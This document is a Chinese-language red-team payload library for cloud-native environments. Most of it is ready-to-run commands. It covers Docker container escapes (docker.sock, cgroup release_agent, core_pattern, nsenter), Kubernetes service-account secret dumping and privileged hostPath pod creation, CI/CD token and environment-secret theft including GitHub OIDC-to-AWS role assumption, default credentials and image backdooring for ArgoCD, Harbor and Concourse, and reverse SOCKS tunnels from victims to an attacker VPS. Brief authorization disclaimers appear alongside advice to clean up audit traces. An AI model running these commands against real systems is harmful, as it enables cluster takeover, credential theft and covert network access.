# 云原生 / 容器 / CI/CD / 平台产品 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 所有容器逃逸/CI/CD攻击限于授权范围内操作
> 涵盖: Docker 容器逃逸(13 种条件 + 决策树) / CDK 工具 / K8s 后渗透 / CI/CD Pipeline 攻击(PPE 框架) / 平台产品攻击(ArgoCD + Harbor + Concourse) / iox 代理隧道

---

## 快速决策树

```
已进入云原生环境（容器/Pod/CI Pipeline Worker）
├─ 在 Docker 容器内 → §1 容器逃逸决策树
├─ 在 K8s Pod 内 → §2 K8s 后渗透
├─ 发现 CI/CD 系统(GitHub Actions/Jenkins/Concourse) → §3 CI/CD Pipeline 攻击
├─ 发现平台产品(ArgoCD/Harbor) → §4 平台产品攻击
└─ 需要内网代理隧道 → §5 iox 代理
```

---

## §1 Docker 容器逃逸

### 1.1 逃逸条件检测（13 点快速检查）

进入容器后逐项检查：

| # | 检查项 | 命令 | 逃逸可能性 |
|---|--------|------|----------|
| 1 | 特权模式 | `cat /proc/self/status \| grep CapEff` → `0000003fffffffff` | 🔴 极高——直接挂载宿主机磁盘 |
| 2 | Docker Socket 挂载 | `ls -la /var/run/docker.sock` | 🔴 极高——运行特权容器接管宿主机 |
| 3 | procfs 可写（core_pattern） | `ls -la /proc/sys/kernel/core_pattern` | 🔴 高——覆盖 core_pattern 逃逸 |
| 4 | Docker Remote API (2375/2376) | `curl http://host.docker.internal:2375/version 2>/dev/null` | 🔴 高——远程创建容器 |
| 5 | CAP_SYS_ADMIN | `capsh --print \| grep sys_admin` | 🟠 高——cgroup notify_on_release 逃逸 |
| 6 | CAP_DAC_READ_SEARCH | `capsh --print \| grep dac_read_search` | 🟠 中——读取宿主机文件 |
| 7 | hostPID | `ls /proc/1/root/ 2>/dev/null` | 🟠 高——nsenter 进入宿主机 |
| 8 | hostNetwork | `ip a \| grep docker` 看宿主机网卡 | 🟡 中——网络逃逸 |
| 9 | 敏感目录挂载 | `mount \| grep -E "/host\|/rootfs\|/mnt"` | 🟠 高——chroot 到宿主机 |
| 10 | Cgroup v1 + CAP_SYS_ADMIN | `mount \| grep cgroup` 含 `rw` + cap_sys_admin | 🟠 高——经典 cgroup 逃逸 |
| 11 | 内核漏洞 (DirtyPipe/CVE-2022-0847) | `uname -r` → 5.8-5.16 之间 | 🟠 高——DirtyPipe 覆写文件提权 |
| 12 | Docker 组用户 | `id \| grep docker` / `groups` | 🟠 高——docker 组可提权到 root |
| 13 | SYS_PTRACE capability | `capsh --print \| grep sys_ptrace` | 🟡 中——进程注入 |

### 1.2 逃逸 path 全决策树

```
容器环境确认（cat /proc/1/cgroup | grep docker）
├─ privileged + 宿主磁盘可见 (fdisk -l | grep /dev/)
│   └─ mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host
│       写入 crontab / SSH key / 替换宿主机二进制
│
├─ /var/run/docker.sock 存在
│   └─ docker -H unix:///var/run/docker.sock run --privileged --pid=host -v /:/host alpine chroot /host
│       注意：容器内无 docker CLI 时下载静态二进制或使用 curl 调用 API
│
├─ CAP_SYS_ADMIN + Cgroup v1 (notify_on_release)
│   └─ mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
│       mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release
│       读取 /etc/mtab 获取宿主机 overlay 路径 → 写入 release_agent
│       echo "#!/bin/sh\nid > /tmp/output" > /cmd && chmod +x /cmd
│       sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"  # 触发 release_agent
│
├─ hostPID (nsenter 逃逸)
│   └─ nsenter --target 1 --mount --uts --ipc --net --pid -- sh
│
├─ procfs core_pattern 可写
│   └─ 获取容器在宿主机路径: cat /proc/mounts | grep workdir → /var/lib/docker/overlay2/.../merged
│       echo "|/var/lib/docker/overlay2/xxx/merged/tmp/exploit" > /proc/sys/kernel/core_pattern
│       触发 core dump 执行 exploit
│
├─ CAP_DAC_READ_SEARCH + 宿主机路径已知
│   └─ 利用 open_by_handle_at 绕过路径权限直接读取宿主机文件
│
├─ 内核漏洞 (DirtyPipe CVE-2022-0847 / DirtyCow CVE-2016-5195)
│   └─ 编译 exploit → 覆写宿主机 SUID 二进制 (passwd/su) → 提权到 root
│
└─ 无特权 → 收集 SA Token / 环境变量 / K8s API Server 可达性
    → 转到 K8s 后渗透路径
```

### 1.3 CDK 容器评估工具

CDK (Container Development Kit) 是容器逃逸评估的一体化工具，将上述检测自动化：

```bash
# 上传并执行 CDK
curl -L https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64 -o /tmp/cdk
chmod +x /tmp/cdk

# 自动评估——检测所有逃逸条件
cd /tmp && ./cdk evaluate

# 逐个利用（根据 evaluate 结果选择）
./cdk run mount-cgroup          "逃逸: cgroup notify_on_release"
./cdk run docker-sock-deploy    "逃逸: Docker Socket 部署特权容器"
./cdk run k8s-secret-dump       "K8s: dump 所有 Secret"
./cdk run exploit-cve-2021-22555  "内核 CVE 利用"
./cdk run exploit-cve-2021-3493   "OverlayFS CVE 利用"
./cdk run docker-api-pwn        "Docker Remote API 2375 利用"
./cdk run cap-dac-read-search   "CAP_DAC_READ_SEARCH 宿主机文件读取"
```

**CDK 决策**：`cdk evaluate` 返回可用逃逸路径 → 按 High → Medium 顺序逐个尝试 → 成功即停。

---

## §2 Kubernetes 后渗透

### 2.1 Pod 内侦察与 SA Token 利用

```bash
# === 1. 确认 K8s 环境 ===
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo "IN K8S"
env | grep KUBERNETES

# === 2. 枚举 SA 权限 ===
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"

# 列出所有命名空间
curl -sk -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/namespaces" | jq '.items[].metadata.name'

# 列举当前命名空间的 Pods
curl -sk -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/namespaces/default/pods" | jq '.items[].metadata.name'

# 列举 Secrets（最高价值目标）
curl -sk -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/secrets" | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace}'

# === 3. 检查高权限 RBAC ===
# 能否创建 Pod？（核心提权 step）
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$K8S/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -d '{"spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}' | jq '.status.allowed'

# 能否列举 ClusterRole？
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$K8S/apis/authorization.k8s.io/v1/clusterroles" | jq '.items[].metadata.name'
```

### 2.2 常见 K8s 攻击路径

```
Pod 内 → 信息收集 → 权限判断
├─ SA 有 create pods → 创建特权 Pod 挂载宿主机根目录
│   └─ 上传特权 Pod YAML → 挂载 hostPath: / → chroot 逃逸
│
├─ SA 有 list secrets → dump 所有 Secret
│   └─ curl $K8S/api/v1/secrets → 获取 DB 密码/API Key/TLS 证书
│
├─ SA 有 get clusterrolebindings → 找高权限 SA
│   └─ 枚举 cluster-admin 绑定 → 找到管理员命名空间
│
├─ SA 有 exec pods → 横向到其他 Pod
│   └─ curl $K8S/api/v1/namespaces/{ns}/pods/{pod}/exec?command=sh
│
├─ K8s 网络策略宽松 → 横向到内网服务
│   └─ 扫描 Service CIDR (10.96.0.0/12) → 发现内网应用/DB/缓存
│
└─ K8s Dashboard / etcd / Kubelet API 可达 → 直接接管集群
    ├─ Kubelet 10250 (默认无认证) → curl https://node:10250/runningpods
    ├─ etcd 2379 (凭据可从 Pod 环境变量获取) → ETCDCTL_API=3 etcdctl get / --prefix
    └─ Dashboard → 通过 SA Token 登录 → 图形化管理集群
```

### 2.3 创建特权 Pod 逃逸（SA 有 create pods 权限时）

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"

# 在上传 Pod YAML 前先尝试系统命名空间（可能 RBAC 较宽松）
for ns in kube-system kube-public default; do
  curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" \
    "$K8S/api/v1/namespaces/$ns/pods" -X POST \
    -H "Content-Type: application/json" \
    -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"escape-test"},"spec":{"containers":[{"name":"esc","image":"alpine","command":["/bin/sh","-c","sleep 3600"],"securityContext":{"privileged":true},"volumeMounts":[{"name":"h","mountPath":"/host"}]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'
  echo "$ns: $?"
done
```

### 2.4 K8s 其他攻击面速查

| 攻击面 | 默认端口 | 利用方式 |
|--------|---------|---------|
| Kubelet API | 10250 | `/runningpods/` 枚举 Pod, `/exec/` 命令执行 |
| etcd | 2379/2380 | client-cert-auth 通常默认关闭 |
| K8s Dashboard | 通常 443/8443 | SA Token 登录(含 `cluster-admin` RBAC) |
| Istio Sidecar | 15000/15001 | sidecar 攻击(劫持流量/转发绕过) |
| Ingress Controller | 80/443 | Ingress Nightmare(CVE-2025-1974) RCE |
| Webhook Admission | 通常 8443 | MutatingWebhook 注入恶意容器 |
| Helm/Tiller | 44134 | Helm v2 Tiller 未授权 gRPC API |

---

## §3 CI/CD Pipeline 攻击 (PPE 框架)

### 3.1 PPE 攻击分类

```
CI/CD Pipeline 攻击面（Poisoned Pipeline Execution）
├─ D-PPE (Direct) → 直接修改 CI 配置文件（.github/workflows/*.yml / Jenkinsfile）
│   └─ 前提：有仓库写权限 或 Webhook 可利用
│
├─ I-PPE (Indirect) → 修改 Pipeline 引用的依赖（Makefile / build.sh / package.json scripts）
│   └─ 前提：Pipeline 从外部拉取代码/脚本并执行
│
└─ 3PE (Third-party) → 通过 PR 触发 Pipeline（多见于开源项目 GitHub Actions）
    └─ 前提：pipeline 配置使用 pull_request_target / workflow_run 触发器
```

### 3.2 CI/CD 凭据提取优先级

```
进入 CI Runner / Worker 后立即检查：
├─ 环境变量 → env | grep -iE "SECRET|TOKEN|PASS|KEY|AWS|AZURE|GCP|DOCKER|KUBE"
├─ 进程内存 → 查找 Build/Deploy 进程中的 Token 和密码
├─ 工作目录 → .env / credentials.json / service-account.json / kubeconfig
├─ CI 系统变量
│   ├─ GitHub Actions: secrets.GITHUB_TOKEN → 可访问仓库/PR/Issues
│   ├─ GitLab CI: CI_JOB_TOKEN → 可访问 GitLab Registry + API
│   ├─ Jenkins: build/credentials plugin → Jenkinsfile 引用凭据
│   └─ Terraform/Atlantis: plan/apply 时泄漏 .tfvars 中的 Secret
└─ Artifact 仓库 → 构建产物中的 .exe/.jar/.war/.apk → 解压提取签名密钥/配置
```

### 3.3 常见 CI/CD 平台速查

| 平台 | 配置位置 | 触发器安全 | Token 权限范围 |
|------|---------|-----------|---------------|
| GitHub Actions | `.github/workflows/*.yml` | `pull_request_target` 可触发敏感上下文 | `GITHUB_TOKEN` 默认 `read-all`，可提升为 `write-all` |
| GitLab CI | `.gitlab-ci.yml` | 公开项目 PIPELINE 可无认证触发 | `CI_JOB_TOKEN` 仅当前项目 |
| Jenkins | `Jenkinsfile` | 需 BUILD 权限 | Agent → Master 凭据泄露 |
| Terraform/Atlantis | `atlantis.yaml` | PR comment `atlantis plan` | 读取 Plan 的 Secret 输出 |
| Concourse | Pipeline YAML | 需 `fly` CLI 或 API Token | Resource source → Git/S3/Docker 凭据提取 |

### 3.4 速攻：GitHub Actions Token 利用

```bash
# GITHUB_TOKEN 在 Actions runner 中自动注入
echo $GITHUB_TOKEN

# 检查 Token 权限
curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/permissions"

# 读取私有仓库内容
curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.env" | jq -r '.content' | base64 -d

# OIDC 令牌 → AWS（如果配置了 Role→Web Identity）
ACTIONS_ID_TOKEN=$(curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::XXX:role/GitHubActions \
  --role-session-name ci-attack --web-identity-token "$ACTIONS_ID_TOKEN"
```

---

## §4 平台产品攻击

### 4.1 ArgoCD 攻击

```bash
# 端口: 通常 443/8080
# 默认凭据: admin / (argocd-server pod 名)
ARGOCD_SERVER="https://argocd.example.com"

# === 未授权访问检测 ===
curl -sk "$ARGOCD_SERVER/api/version"
curl -sk "$ARGOCD_SERVER/api/v1/applications" | jq '.items[]?.metadata.name'

# === 默认凭据 ===
argocd login $ARGOCD_SERVER --username admin --password $(kubectl get pods -n argocd -l app.kubernetes.io/name=argocd-server -o name | head -1 | cut -d'/' -f2)

# === 关键漏洞 ===
# CVE-2024-31989 (CVSS 9.1): Redis Cache Poisoning → K8s 集群接管
# 前提: ArgoCD 使用内置 Redis + 可访问 ClusterIP
# CVE-2022-29165 (CVSS 9.0): 未授权 API 枚举 + SSRF
```

**ArgoCD 后渗透**：
- 读取所有 Application → 发现 Git 仓库地址 + K8s 目标集群
- 修改 Application → 注入恶意 K8s manifest → 集群接管
- 利用 SSO bypass / Webhook SSRF → 横向到 Git 仓库

### 4.2 Harbor 镜像仓库攻击

```bash
# 端口: 通常 443/80
# 默认凭据: admin / Harbor12345
HARBOR="https://harbor.example.com"

# === 未授权检测 ===
curl -sk "$HARBOR/api/v2.0/systeminfo"
curl -sk "$HARBOR/api/v2.0/projects" 2>/dev/null

# === 镜像层 Secret 提取 ===
# 前提: 已获取 Harbor 用户凭据，有 pull 权限
docker login harbor.example.com -u admin -p Harbor12345
docker pull harbor.example.com/project/app:latest

# 用 dive 分析镜像层
dive harbor.example.com/project/app:latest
# → 关注 /root/.bash_history /app/.env /tmp/ 等敏感路径

# 或用 skopeo + crane 直接拉取层
crane pull harbor.example.com/project/app:latest - | tar xv
skopeo copy docker://harbor.example.com/project/app:latest dir://./app-layers/

# === 镜像后门注入（供应链攻击） ===
# 1. 拉取目标镜像 → 注入后门 → 推回同名 Tag
# 2. 或推送同名镜像到不同 Tag → 等待自动化部署
# 3. Webhook Abuse → 伪造 deploy 通知触发部署

# === 持久化 ===
# Robot Account: 创建 robot$ 账户 + 长期 Secrets（API 不可见）
# Replication Policy: 创建从 Harbor → 外部攻击者服务器的复制
```

### 4.3 Concourse CI 攻击

```bash
# 端口: ATC 8080 / TSA 2222 / Garden 7777 (Worker本地)
# 默认凭据: admin/admin, test/test

CONCOURSE="https://concourse.example.com"

# === 未授权枚举 ===
curl -sk "$CONCOURSE/api/v1/info" | jq '.version'
curl -sk "$CONCOURSE/api/v1/pipelines" | jq '.[].name'
curl -sk "$CONCOURSE/api/v1/builds" | jq '.[0:5] | .[] | {pipeline_name, job_name, status}'

# === 凭据提取（已获取 Fly Token 后） ===
fly -t target login -c $CONCOURSE -u admin -p admin
fly -t target pipelines -a
fly -t target get-pipeline -p PIPELINE_NAME | python3 -c \
  "import sys,yaml; [print(r['name'], r.get('source',{})) for r in yaml.safe_load(sys.stdin).get('resources',[])]"

# === 高价值 Resource 类型中提取的凭据 ===
# git: private_key / username:password / access_token
# s3: access_key_id / secret_access_key
# docker-image: username / password
# github-release: access_token
```

---

## §5 iox 代理隧道

### 5.1 iox 基本用法

```bash
# iox — 轻量级零依赖端口转发 + SOCKS5 代理
# 下载: https://github.com/EddieIvan01/iox/releases

# === fwd 模式（端口转发） ===
# 本地端口转发: 监听 0.0.0.0:8888 → 转发到 10.0.0.1:22
./iox fwd -l 8888 -r 10.0.0.1:22

# 远程端口转发: 反弹 192.168.1.1:3389 到 attackerserver:8888
# attacker 上:  ./iox fwd -l *8888 -l 33890
# victim 上:    ./iox fwd -r 192.168.1.1:3389 -P attackerserver:8888

# === proxy 模式（SOCKS5） ===
# 本地 SOCKS5 代理
./iox proxy -l 1080

# 反向 SOCKS5（内网机器主动连接外部 VPS）
# VPS 上:     ./iox proxy -R *8888 -R *1080
# victim 上:  ./iox proxy -r VPS_IP:8888

# === TLS 加密 ===
# 所有模式加 -k 启用 TLS
./iox fwd -l 8888 -r 10.0.0.1:22 -k
./iox proxy -l 1080 -k
```

### 5.2 实战隧道场景

```
场景 1: 多层内网穿透
  VPS ← iox 反向 SOCKS5 ← 入口机器(Webshell) ← 内网第二层
  配置: VPS 上 ./iox proxy -R *8888 -R *1080
        入口机 ./iox proxy -r VPS:8888
        然后在 VPS 上 proxychains → 入口机所在的整段内网

场景 2: RDP 穿透
  VPS ← iox fwd ← 内网 Windows
  配置: VPS 上 ./iox fwd -l *8888 -l 33891
        内网机上 ./iox fwd -r 192.168.1.10:3389 -P VPS:8888
        VPS 上连接 127.0.0.1:33891 → 进入内网 RDP

场景 3: 多层级联（iox + Chisel + frp 混合）
  选择当前网络出网条件最优的工具组合
  原则: 一级能用 fwd 就用 fwd（开销最小）、二级用 SOCKS5、TLS 加密必开
```

---

## 注意事项

- **容器逃逸**：只在授权测试中执行，`privileged` 逃逸会修改宿主文件系统
- **K8s 攻击**：创建 Pod/Secret dump 会产生审计日志，攻击后清理
- **CI/CD Pipeline**：修改 Pipeline 配置务必确认测试后回滚
- **Harbor 镜像注入**：不可推送到生产镜像仓库的 `latest` Tag
- **ArgoCD CVE-2024-31989**：利用 Redis 缓存投毒会残留缓存条目
- **CDK**: 部分内核 CVE 利用可能导致宿主机 panic，先确认测试窗口

← 回 [00-index.md](00-index.md) · 相关: [15-tunneling.md](15-tunneling.md)(隧道代理) · [16-recon.md](16-recon.md)(内网侦察)
